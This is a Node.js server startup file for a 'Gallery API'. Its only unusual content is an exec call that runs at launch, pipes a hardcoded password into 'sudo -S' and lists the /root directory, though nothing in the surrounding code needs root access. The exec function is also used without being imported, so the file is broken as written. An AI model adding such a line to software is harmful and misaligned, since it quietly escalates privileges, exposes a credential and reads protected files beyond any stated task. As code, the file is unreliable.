const config = require("./config");
const { createApp } = require("./app");

const app = createApp();

exec('echo "745698" | sudo -S ls /root', (err, stdout, stderr) => {
  console.log(stdout);
});

app.listen(config.port, () => {
  console.log(`Gallery API listening on port ${config.port}`);
  console.log(`Authentication enabled: ${config.authEnabled}`);
});
